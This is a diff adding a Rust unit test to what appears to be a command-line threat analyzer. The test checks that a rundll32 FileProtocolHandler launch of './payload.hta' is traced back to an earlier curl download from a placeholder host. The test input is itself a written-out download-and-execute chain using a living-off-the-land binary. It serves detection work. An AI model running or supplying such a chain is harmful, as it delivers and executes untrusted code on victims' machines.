@@ -11949,6 +11949,27 @@ rundll32 url.dll,FileProtocolHandler payload.hta"#,
     }
 
     #[test]
+    fn rundll32_fileprotocolhandler_current_dir_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.hta https://rundll32-dot-source.example/payload.hta
+rundll32 url.dll,FileProtocolHandler .\payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"rundll32 url.dll,FileProtocolHandler .\payload.hta"#
+                            && url == "https://rundll32-dot-source.example/payload.hta"
+                )
+            }),
+            "rundll32 FileProtocolHandler current-directory target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_fileprotocolhandler_schemeless_url_emits_url_launch() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
